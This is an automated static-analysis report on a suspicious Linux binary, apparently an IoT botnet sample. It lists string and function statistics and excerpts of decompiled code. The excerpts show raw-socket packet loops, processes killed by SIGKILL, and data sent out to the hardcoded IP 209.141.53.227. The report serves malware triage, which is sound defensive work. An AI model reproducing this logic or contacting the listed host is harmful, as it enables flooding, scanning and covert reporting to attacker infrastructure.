=============================================================================
========	BINARY ID :d35f23989c136b6658bbfea9ab7d92fe88c802b2==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :141
SUPSCPECTED LINES COUNT :9
SUPSCPECTED STRINGS COUNT (DISTINCT) :8
SUPSCPECTED STRINGS WEIGHT :30
SUSPECT STRING SCORE : [30 / 150] 20%
USER AGENTS STRINGS COUNT :0
STATIC IPs STRINGS COUNT :1
DYNAMIC IPs STRINGS COUNT :0
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
connect
getpid
socket
kill
bind
inet_addr
fork
getppid
sigprocmask
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
209.141.53.227
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 42321
+++TOTAL FUNCTIONS 			:114
+++LINES PER FUNCTION RATIO 	: 371.236842105263
+++SUSPECTED LINES COUNT 	: 722
+++SUSPECTED LINES RATIO 	: 1.70600883722029
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 42321
+++WHILE (TRUE) LINES			: 7566
+++WHILE (TRUE) LINES RATION		:17.8776493939179%
+++WHILE (TRUE) LOOPS COUNT		: 88
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
    int32_t v237 = inet_addr("209.141.53.227");

                                                                                                                                    inet_addr("209.141.53.227");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
function_f9e4                                     |1   |6919    |148           |2336        |
----------------------------------------------------------------------------------------------
function_e49c                                     |1   |736     |76            |458         |
----------------------------------------------------------------------------------------------
function_b68c                                     |4   |955     |51            |434         |
----------------------------------------------------------------------------------------------
function_eddc                                     |2   |639     |42            |269         |
----------------------------------------------------------------------------------------------
function_df00                                     |1   |893     |38            |515         |
----------------------------------------------------------------------------------------------
function_be3c                                     |4   |582     |25            |264         |
----------------------------------------------------------------------------------------------
function_c6b8                                     |4   |582     |25            |264         |
----------------------------------------------------------------------------------------------
__data_start                                      |2   |0       |23            |0           |
----------------------------------------------------------------------------------------------
function_99bc                                     |5   |380     |19            |106         |
----------------------------------------------------------------------------------------------
function_96d4                                     |5   |380     |19            |106         |
----------------------------------------------------------------------------------------------
function_901c                                     |4   |654     |14            |231         |
----------------------------------------------------------------------------------------------
function_d6a8                                     |4   |518     |13            |228         |
----------------------------------------------------------------------------------------------
function_cf34                                     |4   |535     |12            |243         |
----------------------------------------------------------------------------------------------
function_b1c8                                     |4   |419     |12            |136         |
----------------------------------------------------------------------------------------------
function_9ca4                                     |4   |498     |12            |153         |
----------------------------------------------------------------------------------------------
function_a330                                     |4   |488     |11            |201         |
----------------------------------------------------------------------------------------------
function_aaac                                     |4   |479     |11            |197         |
----------------------------------------------------------------------------------------------
function_13450                                    |3   |0       |8             |70          |
----------------------------------------------------------------------------------------------
function_132a4                                    |0   |0       |7             |0           |
----------------------------------------------------------------------------------------------
function_f560                                     |1   |241     |7             |0           |
----------------------------------------------------------------------------------------------
__modsi3                                          |2   |0       |5             |380         |
----------------------------------------------------------------------------------------------
function_ecf0                                     |1   |271     |5             |5           |
----------------------------------------------------------------------------------------------
__udivsi3                                         |2   |0       |5             |212         |
----------------------------------------------------------------------------------------------
function_133cc                                    |3   |0       |5             |40          |
----------------------------------------------------------------------------------------------
__umodsi3                                         |2   |0       |5             |354         |
----------------------------------------------------------------------------------------------
function_f76c                                     |0   |260     |5             |0           |
----------------------------------------------------------------------------------------------
function_8f2c                                     |6   |298     |5             |13          |
----------------------------------------------------------------------------------------------
function_9270                                     |5   |282     |4             |16          |
----------------------------------------------------------------------------------------------
function_13118                                    |2   |0       |4             |147         |
----------------------------------------------------------------------------------------------
function_13340                                    |3   |0       |3             |48          |
----------------------------------------------------------------------------------------------
function_13014                                    |2   |0       |3             |24          |
----------------------------------------------------------------------------------------------
_close                                            |1   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_recvfrom                                         |8   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_connect                                          |4   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_getpid                                           |0   |240     |2             |0           |
----------------------------------------------------------------------------------------------
function_f688                                     |1   |285     |2             |41          |
----------------------------------------------------------------------------------------------
_getppid                                          |0   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_listen                                           |2   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_inet_addr                                        |1   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_fork                                             |0   |240     |2             |0           |
----------------------------------------------------------------------------------------------
function_13244                                    |3   |0       |2             |24          |
----------------------------------------------------------------------------------------------
_open                                             |3   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_socket                                           |3   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_recv                                             |4   |240     |2             |0           |
----------------------------------------------------------------------------------------------
function_ec9c                                     |0   |249     |2             |0           |
----------------------------------------------------------------------------------------------
function_130b0                                    |4   |0       |2             |20          |
----------------------------------------------------------------------------------------------
_sigprocmask                                      |5   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_setsockopt                                       |5   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_kill                                             |2   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_getsockname                                      |4   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_closedir                                         |2   |240     |2             |0           |
----------------------------------------------------------------------------------------------
function_8ec8                                     |4   |272     |2             |15          |
----------------------------------------------------------------------------------------------
function_92dc                                     |4   |282     |2             |16          |
----------------------------------------------------------------------------------------------
_getsockopt                                       |6   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_send                                             |4   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_sendto                                           |7   |240     |2             |0           |
----------------------------------------------------------------------------------------------
_select                                           |9   |240     |1             |0           |
----------------------------------------------------------------------------------------------
function_ddf4                                     |2   |279     |1             |0           |
----------------------------------------------------------------------------------------------
function_8e2c                                     |0   |245     |1             |0           |
----------------------------------------------------------------------------------------------
function_f508                                     |0   |246     |1             |0           |
----------------------------------------------------------------------------------------------
_readlink                                         |4   |240     |1             |0           |
----------------------------------------------------------------------------------------------
function_12a20                                    |1   |280     |1             |0           |
----------------------------------------------------------------------------------------------
_sleep                                            |1   |240     |1             |0           |
----------------------------------------------------------------------------------------------
_setsid                                           |0   |240     |1             |0           |
----------------------------------------------------------------------------------------------
function_12968                                    |1   |280     |1             |0           |
----------------------------------------------------------------------------------------------
_sigaddset                                        |3   |240     |1             |0           |
----------------------------------------------------------------------------------------------
*                                                 |0   |240     |1             |0           |
----------------------------------------------------------------------------------------------
_prctl                                            |5   |240     |1             |0           |
----------------------------------------------------------------------------------------------
function_f5bc                                     |2   |260     |1             |0           |
----------------------------------------------------------------------------------------------
function_f840                                     |3   |293     |1             |0           |
----------------------------------------------------------------------------------------------
_fcntl                                            |2   |240     |1             |0           |
----------------------------------------------------------------------------------------------
_clock                                            |0   |240     |1             |0           |
----------------------------------------------------------------------------------------------
__start                                           |2   |244     |1             |0           |
----------------------------------------------------------------------------------------------
_bind                                             |4   |240     |1             |0           |
----------------------------------------------------------------------------------------------
function_934c                                     |1   |285     |1             |0           |
----------------------------------------------------------------------------------------------
_time                                             |1   |240     |1             |0           |
----------------------------------------------------------------------------------------------
function_8b28                                     |0   |241     |1             |0           |
----------------------------------------------------------------------------------------------
_read                                             |3   |240     |1             |0           |
----------------------------------------------------------------------------------------------
___uClibc_main                                    |7   |240     |1             |0           |
----------------------------------------------------------------------------------------------
function_12fec                                    |1   |0       |1             |0           |
----------------------------------------------------------------------------------------------
_ioctl                                            |2   |240     |1             |0           |
----------------------------------------------------------------------------------------------
function_1308c                                    |0   |0       |1             |0           |
----------------------------------------------------------------------------------------------
function_de50                                     |4   |310     |1             |0           |
----------------------------------------------------------------------------------------------
_write                                            |3   |240     |1             |0           |
----------------------------------------------------------------------------------------------
_sigemptyset                                      |2   |240     |1             |0           |
----------------------------------------------------------------------------------------------
function_13068                                    |3   |0       |1             |0           |
----------------------------------------------------------------------------------------------
_unlink                                           |1   |240     |1             |0           |
----------------------------------------------------------------------------------------------
function_ec84                                     |1   |241     |1             |0           |
----------------------------------------------------------------------------------------------
function_13868                                    |0   |0       |1             |0           |
----------------------------------------------------------------------------------------------
__aeabi_uidivmod                                  |2   |0       |1             |0           |
----------------------------------------------------------------------------------------------
function_12ad8                                    |4   |0       |1             |0           |
----------------------------------------------------------------------------------------------
_atoi                                             |1   |240     |1             |0           |
----------------------------------------------------------------------------------------------
function_1293c                                    |2   |251     |1             |0           |
----------------------------------------------------------------------------------------------
function_8e20                                     |1   |247     |1             |0           |
----------------------------------------------------------------------------------------------
function_8dac                                     |0   |272     |1             |0           |
----------------------------------------------------------------------------------------------
function_8b40                                     |1   |248     |1             |0           |
----------------------------------------------------------------------------------------------
function_13860                                    |0   |0       |1             |0           |
----------------------------------------------------------------------------------------------
__aeabi_ldiv0                                     |0   |0       |1             |0           |
----------------------------------------------------------------------------------------------
function_1382c                                    |1   |0       |1             |0           |
----------------------------------------------------------------------------------------------
function_8e84                                     |0   |241     |1             |0           |
----------------------------------------------------------------------------------------------
_free                                             |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
sig,                                              |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_memcpy                                           |4   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_exit                                             |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_strcpy                                           |3   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_abort                                            |0   |0       |0             |0           |
----------------------------------------------------------------------------------------------
dirent                                            |3   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_memmove                                          |4   |0       |0             |0           |
----------------------------------------------------------------------------------------------
___errno_location                                 |0   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_malloc                                           |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
__dirstream                                       |2   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_realloc                                          |2   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_memset                                           |3   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_calloc                                           |2   |0       |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : function_f9e4 ===================
++++++++ FUNCTION START 27274
++++++++ FUNCTION END 34193
++++++++ FUNCTION LENGTH 6919
    struct sockaddr * v106;
    int32_t sock_fd2;
    int32_t v217 = sock_fd2; // bp-36
    int32_t result = fork(); // 0xf9f0
    sock_fd2 = v218;
    int32_t time_val = time((int32_t *)sock_fd2);
    int32_t level = sock_fd2; // 0xfad8
    int32_t sock;
    while (true) {
            int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xfb2c
            sock = sock_fd;
            fcntl(sock_fd, F_GETFL);
            fcntl(sock_fd, F_SETFL);
            if (setsockopt(sock, level, 3, &option_value, 4) != 0) {
                close(sock);
            while (true) {
                    while (true) {
                        while (true) {
                while (true) {
                    uint32_t v248 = recvfrom(sock, &buf, 1514, MSG_NOSIGNAL, (struct sockaddr *)addr, (int32_t *)addr); // 0x11888
                        while (true) {
                            sock_fd2 = v222 + 288 * v254;
                                close(fd);
                                    char * v263 = (char *)(sock_fd2 + 284); // 0x11b40
                        while (true) {
                            int32_t sock18; // 0x11c10
                            if (sock18 != -1) {
                                if ((v274 >> sock18 % 32) % 2 == 0) {
                                    v272 = sock18;
                                            while (true) {
                                                while (true) {
                                                    sock_fd2 = buf2;
                                                    int32_t sock2; // 0x11dd8
                                                    int32_t v284 = recv(sock2, (int32_t *)buf2, 256 - v283, MSG_NOSIGNAL); // 0x11de8
                                                                    close(fd2);
                                                                while (true) {
                                                                        case 2: {
                                                                            sock_fd2 = v320;
                                                                                while (true) {
                                                                                    while (true) {
                                                                                                    sock_fd2 = v337;
                                                                                                            int32_t v344 = sock_fd2; // 0x12574
                                                                                                                int32_t sock3; // 0x12658
                                                                                                                send(sock3, &buf3, 3, MSG_NOSIGNAL);
                                                                                                                    v354 = (char *)sock_fd2;
                                                                                                                        v357 = (char *)(sock_fd2 + 1);
                                                                                                                            send(0x4000, (int32_t *)buf4, 3, MSG_NOSIGNAL);
                                                                                                                            v348 = sock_fd2 + 3;
                                                                                                                            sock_fd2 = v348;
                                                                                                                    v357 = (char *)(sock_fd2 + 1);
                                                                                                                v354 = (char *)sock_fd2;
                                                                                                            send(0x4000, (int32_t *)(int32_t)&buf5, 9, MSG_NOSIGNAL);
                                                                                                            v348 = sock_fd2 + 3;
                                                                                                            sock_fd2 = v348;
                                                                                                            while (true) {
                                                                                                                    case 2: {
                                                                                                                        sock_fd2 = v320;
                                                                                                                            while (true) {
                                                                                                                    case 3: {
                                                                                                                            int32_t sock4; // 0x11fc8
                                                                                                                            send(sock4, (int32_t *)buf6, (int32_t)length, MSG_NOSIGNAL);
                                                                                                                            int32_t sock5; // 0x11fe0
                                                                                                                            send(sock5, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                                    while (true) {
                                                                                                                    case 4: {
                                                                                                                                int32_t sock6; // 0x12074
                                                                                                                                send(sock6, (int32_t *)buf7, (int32_t)length2, MSG_NOSIGNAL);
                                                                                                                                int32_t sock7; // 0x1208c
                                                                                                                                send(sock7, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                                    while (true) {
                                                                                                                    case 5: {
                                                                                                                                    while (true) {
                                                                                                                                                            int32_t sock8; // 0x12140
                                                                                                                                                            send(sock8, (int32_t *)buf8, (int32_t)length3, MSG_NOSIGNAL);
                                                                                                                                                            int32_t sock9; // 0x12154
                                                                                                                                                            send(sock9, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                    case 6: {
                                                                                                                                while (true) {
                                                                                                                                    int32_t sock10; // 0x12208
                                                                                                                                    send(sock10, (int32_t *)buf9, length4, MSG_NOSIGNAL);
                                                                                                                                    int32_t sock11; // 0x1221c
                                                                                                                                    send(sock11, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                    case 7: {
                                                                                                                                while (true) {
                                                                                                                                    int32_t sock12; // 0x12398
                                                                                                                                    send(sock12, (int32_t *)buf10, length4, MSG_NOSIGNAL);
                                                                                                                                    int32_t sock13; // 0x123ac
                                                                                                                                    send(sock13, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                    case 8: {
                                                                                                                                while (true) {
                                                                                                                                    int32_t sock14; // 0x122d0
                                                                                                                                    send(sock14, (int32_t *)buf11, (int32_t)length3, MSG_NOSIGNAL);
                                                                                                                                    int32_t sock15; // 0x122e4
                                                                                                                                    send(sock15, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                    case 9: {
                                                                                                                                while (true) {
                                                                                                                                    int32_t sock16; // 0x12504
                                                                                                                                    send(sock16, (int32_t *)buf12, (int32_t)length3, MSG_NOSIGNAL);
                                                                                                                                    int32_t sock17; // 0x12518
                                                                                                                                    send(sock17, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                    case 10: {
                                                                                                                            int32_t v444 = fork(); // 0x12758
                                                                                                                                    sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
                                                                                                                                    inet_addr("209.141.53.227");
                                                                                                                                    if (connect(sock_fd2, (struct sockaddr *)&addr2, 16) == -1) {
                                                                                                                                        close(sock_fd2);
                                                                                                                                    send(sock_fd2, (int32_t *)&length3, 1, MSG_NOSIGNAL);
                                                                                                                                    send(sock_fd2, &length4, 4, MSG_NOSIGNAL);
                                                                                                                                    send(sock_fd2, &buf13, length5, MSG_NOSIGNAL);
                                                                                                                                    send(sock_fd2, (int32_t *)(v319 + 12), 1, MSG_NOSIGNAL);
                                                                                                                                    send(sock_fd2, (int32_t *)buf14, (int32_t)length6, MSG_NOSIGNAL);
                                                                                                                                    send(sock_fd2, (int32_t *)(v319 + 13), 1, MSG_NOSIGNAL);
                                                                                                                                    send(sock_fd2, (int32_t *)buf15, (int32_t)length7, MSG_NOSIGNAL);
                                                                                                                                    close(sock_fd2);
                                                                                                                            close(fd3);
                                                                                                                            close(fd4);
                                                                                    while (true) {
                                                                        case 3: {
                                                                        case 4: {
                                                                        case 5: {
                                                                        case 6: {
                                                                        case 7: {
                                                                        case 8: {
                                                                        case 9: {
                                                                        case 10: {
                                                        close(fd2);
                                                        while (true) {
                                                            char * v452 = (char *)(sock_fd2 + v451); // 0x11dfc
                                    if ((length4 || getsockopt(sock18, SO_DEBUG, 4, &length4, (int32_t *)&length3)) == 0) {
                                            while (true) {
                                        close(fd5);
                        while (true) {
    while (true) {
    while (true) {
                while (true) {
                                                                                                                                                                                        while (true) {
                                                                                                                    while (true) {
                                                                                            while (true) {
                                                                            while (true) {
                                                while (true) {
                                while (true) {
                        while (true) {
                                    while (true) {
            while (true) {
            sendto(sock, &message, 40, MSG_NOSIGNAL, (struct sockaddr *)&addr2, 16);
        while (true) {
    while (true) {
    sendto(sock, &message, 40, MSG_NOSIGNAL, (struct sockaddr *)&addr2, 16);
=================FUNCTION : function_e49c ===================
++++++++ FUNCTION START 23520
++++++++ FUNCTION END 24256
++++++++ FUNCTION LENGTH 736
    struct sockaddr * v122;
    int32_t result = fork(); // 0xe4b0
    int32_t sock2 = (int32_t)&path + function_13014((char *)&path, v237);
    int32_t pid = getpid(); // 0xe540
    sock2 += function_13014((char *)sock2, v239);
    function_13014((char *)sock2, function_1293c(14, (int32_t *)oflag));
    int32_t fd = open((char *)&path, oflag); // 0xe588
        close(fd);
        while (true) {
            struct __dirstream * v242 = opendir((char *)function_1293c(13, NULL)); // 0xe60c
                int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xe70c
                sock2 = sock_fd;
                if (sock_fd != -1) {
                    int32_t sock; // bp-60
                    bind((int32_t)&sock, (struct sockaddr *)16, 16);
                    listen(sock2, 1);
                int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xe754
                int32_t sock4 = sock_fd2; // r4
                if (sock_fd2 != -1) {
                    int32_t sock3; // bp-76
                    bind((int32_t)&sock3, (struct sockaddr *)16, 16);
                    listen(sock4, 1);
                int32_t sock_fd3 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xe78c
                sock4 = sock_fd3;
                if (sock_fd3 != -1) {
                    int32_t sock5; // bp-124
                    bind((int32_t)&sock5, (struct sockaddr *)16, 16);
                    listen(sock4, 1);
                int32_t sock_fd4 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xe7c4
                sock4 = sock_fd4;
                if (sock_fd4 != -1) {
                    int32_t sock6; // bp-140
                    bind((int32_t)&sock6, (struct sockaddr *)16, 16);
                    listen(sock4, 1);
                int32_t sock_fd5 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xe7fc
                sock4 = sock_fd5;
                if (sock_fd5 != -1) {
                    int32_t sock7; // bp-92
                    bind((int32_t)&sock7, (struct sockaddr *)16, 16);
                    listen(sock4, 1);
                int32_t sock_fd6 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xe834
                sock2 = sock_fd6;
                if (sock_fd6 != -1) {
                    int32_t sock8; // bp-108
                    bind((int32_t)&sock8, (struct sockaddr *)16, 16);
                    listen(sock2, 1);
                struct dirent * v244 = readdir((struct __dirstream *)dirp); // 0xe86455
                    while (true) {
                        while (true) {
                                    sock2 = v263;
                                        int32_t fd2 = open((char *)&path2, O_RDONLY); // 0xeab4
                                                while (true) {
                                                        while (true) {
                                                                    close(fd4);
                                                                    kill(time_val, SIGKILL);
                                                                    v251 = readdir((struct __dirstream *)dirp);
                                                                while (true) {
                                                close(fd4);
                                            close(fd4);
                                        if (function_13340((char *)&path, sock2 - 1, v285) != -1) {
                                            kill(time_val, SIGKILL);
                                        int32_t pid2 = getpid(); // 0xea4c
                                            int32_t ppid = getppid(); // 0xea58
                                                    int32_t fd3 = open((char *)&path, O_RDONLY); // 0xea90
                                                    sock2 = fd3;
                                                        kill(time_val, SIGKILL);
                                                        fd5 = sock2;
                                                    close(fd5);
                                                v251 = readdir((struct __dirstream *)dirp);
                                    v251 = readdir((struct __dirstream *)dirp);
                                        struct dirent * v288 = readdir((struct __dirstream *)dirp); // 0xe8e4
                                    v251 = readdir((struct __dirstream *)dirp2);
                                v251 = readdir((struct __dirstream *)dirp2);
                            v251 = readdir((struct __dirstream *)dirp);
                        closedir((struct __dirstream *)dirp);
                closedir((struct __dirstream *)dirp);
=================FUNCTION : function_b68c ===================
++++++++ FUNCTION START 18842
++++++++ FUNCTION END 19797
++++++++ FUNCTION LENGTH 955
    struct sockaddr * v124;
    fd = open((char *)function_1293c(21, NULL), O_RDONLY);
    int32_t sock_fd; // 0xb90c
        close(fd);
                while (true) {
                                        result = inet_addr((char *)&cp);
                                        sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                                        if (sock_fd == -1) {
                                        if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
                                            result2 = close(sock_fd);
                                            while (true) {
                                                    while (true) {
                                            while (true) {
                                            while (true) {
                                                                sendto(sock_fd, (int32_t *)fd, v249 + 47, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
                                    result = inet_addr((char *)&cp);
                                    sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                                    if (sock_fd == -1) {
                                    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
                                        result2 = close(sock_fd);
                                        while (true) {
                    case 0: {
                    case 1: {
                    case -2: {
                    case -1: {
                sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if (sock_fd == -1) {
                if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
                    result2 = close(sock_fd);
                    while (true) {
                while (true) {
            case 0: {
            case 1: {
            case -2: {
            case -1: {
        sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (sock_fd == -1) {
        if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
            result2 = close(sock_fd);
            while (true) {
        while (true) {
        case 0: {
        case 1: {
        case -2: {
        case -1: {
    sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock_fd == -1) {
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
        result2 = close(sock_fd);
        while (true) {
    while (true) {
=================FUNCTION : function_eddc ===================
++++++++ FUNCTION START 25029
++++++++ FUNCTION END 25668
++++++++ FUNCTION LENGTH 639
    sigprocmask(how, (struct _TYPEDEF_sigset_t *)&set, (struct _TYPEDEF_sigset_t *)how);
    struct sockaddr * addr;
        if (fork() > fd2) {
        close(fd2);
        close(1);
        v242 = close(2);
        while (true) {
                while (true) {
                    while (true) {
                    int32_t sock;
                    if (sock == -1) {
                        int32_t sock_fd = socket(AF_INET, SOCK_STREAM, protocol); // 0xf2e8
                        int32_t fd3 = sock_fd; // r5
                        if (sock_fd != -1) {
                            fcntl(sock_fd, F_GETFL);
                            connect(sock, (struct sockaddr *)&addr, 16);
                    uint32_t v271 = sock; // 0xf1c0
                    int32_t v275 = sock; // 0xf0ec
                                send(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
                        uint32_t sock2 = sock; // 0xf1ec
                            if (sock2 != -1) {
                                if ((v283 >> sock2 % 32) % 2 != 0) {
                                    int32_t v284 = recv(sock, (int32_t *)&buf2, 2, MSG_PEEK | MSG_NOSIGNAL); // 0xf24c
                                                __pseudo_cond_branch(sock != -1, (int32_t)&v282);
                                                sock = -1;
                                            recv(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
                                                close(sock);
                                                int32_t v288 = recv(sock, &buf3, length, MSG_PEEK | MSG_NOSIGNAL); // 0xf2a4
                                                recv(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
                                                recv(sock, &buf3, length2, MSG_NOSIGNAL);
                            if ((v293 >> sock2 % 32) % 2 == 0) {
                                __pseudo_cond_branch(sock2 != -1, (int32_t)&v282);
                                getsockopt(sock2, SO_DEBUG, 4, &option_value, &option_len);
                                    send(sock, &buf4, 4, MSG_NOSIGNAL);
                                    send(sock, (int32_t *)&buf2, 1, MSG_NOSIGNAL);
                                    send(sock, &buf5, length3, MSG_NOSIGNAL);
                                    close(sock);
    if (fork() > fd2) {
    close(fd2);
    close(1);
    v242 = close(2);
    while (true) {
=================FUNCTION : function_df00 ===================
++++++++ FUNCTION START 22624
++++++++ FUNCTION END 23517
++++++++ FUNCTION LENGTH 893
    struct sockaddr * v123;
    int32_t fd = open((char *)function_1293c(17, (int32_t *)oflag), oflag); // 0xdfe0
    struct __dirstream * dirp; // 0xe1b8
        close(fd2);
            dirp = opendir((char *)name);
                    while (true) {
                closedir((struct __dirstream *)fd2);
    while (true) {
                while (true) {
                            while (true) {
                                while (true) {
                                                    while (true) {
                                                close(fd2);
                                                dirp = opendir((char *)name);
                                                    while (true) {
                                                        while (true) {
                                                                        struct __dirstream * dirp2 = opendir((char *)&path); // 0xe2b4
                                                                                while (true) {
                                                                                    while (true) {
                                                                                                    kill(function_13118((char *)v280, 10), SIGKILL);
                                                                                                    struct dirent * v298 = readdir((struct __dirstream *)dirp3); // 0xe3b0
                                                                                            struct dirent * v299 = readdir((struct __dirstream *)dirp3); // 0xe2c4
                                                                                    closedir((struct __dirstream *)dirp3);
                                                                                    v289 = readdir((struct __dirstream *)fd2);
                                                                                closedir((struct __dirstream *)dirp4);
                                                                            closedir((struct __dirstream *)dirp3);
                                                                            v289 = readdir((struct __dirstream *)fd2);
                                                                struct dirent * v309 = readdir((struct __dirstream *)fd2); // 0xe1d0
                                                        closedir((struct __dirstream *)fd2);
                                                closedir((struct __dirstream *)fd2);
                                close(fd2);
                                dirp = opendir((char *)name);
                                    while (true) {
                                closedir((struct __dirstream *)fd2);
    close(fd2);
        dirp = opendir((char *)name);
                while (true) {
            closedir((struct __dirstream *)fd2);
=================FUNCTION : function_be3c ===================
++++++++ FUNCTION START 19800
++++++++ FUNCTION END 20382
++++++++ FUNCTION LENGTH 582
    struct sockaddr * v124;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xc00c
    if (sock_fd == -1) {
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
        result = close(sock_fd);
            while (true) {
                int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc0a0107
                fd = sock_fd2;
                if (sock_fd2 != -1) {
                    while (true) {
                        fcntl(sock_fd2, F_GETFL);
                        connect(fd, (struct sockaddr *)&addr, 16);
                        while (true) {
                            int32_t v267 = recvfrom(sock_fd, &buf, 256, MSG_NOSIGNAL, (struct sockaddr *)&addr2, &addr_len); // 0xc208
                                                close(fd);
                        close(fd);
                        int32_t sock_fd3 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc0a0
                        fd = sock_fd3;
                        if (sock_fd3 == -1) {
                        sock_fd2 = sock_fd3;
            while (true) {
                while (true) {
                    sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(24 * option_value + a2), 16);
                sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(24 * option_value + a2), 16);
        while (true) {
=================FUNCTION : function_c6b8 ===================
++++++++ FUNCTION START 20385
++++++++ FUNCTION END 20967
++++++++ FUNCTION LENGTH 582
    struct sockaddr * v124;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xc888
    if (sock_fd == -1) {
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
        result = close(sock_fd);
            while (true) {
                int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc91c107
                fd = sock_fd2;
                if (sock_fd2 != -1) {
                    while (true) {
                        fcntl(sock_fd2, F_GETFL);
                        connect(fd, (struct sockaddr *)&addr, 16);
                        while (true) {
                            int32_t v267 = recvfrom(sock_fd, &buf, 256, MSG_NOSIGNAL, (struct sockaddr *)&addr2, &addr_len); // 0xca84
                                                close(fd);
                        close(fd);
                        int32_t sock_fd3 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc91c
                        fd = sock_fd3;
                        if (sock_fd3 == -1) {
                        sock_fd2 = sock_fd3;
            while (true) {
                while (true) {
                    sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(24 * option_value + a2), 16);
                sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(24 * option_value + a2), 16);
        while (true) {
=================FUNCTION : __data_start ===================
++++++++ FUNCTION START 42016
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
// int bind(int fd, __CONST_SOCKADDR_ARG addr, socklen_t len);
// int close(int fd);
// int closedir(DIR * dirp);
// int connect(int fd, __CONST_SOCKADDR_ARG addr, socklen_t len);
// __pid_t fork(void);
// void free(void * ptr);
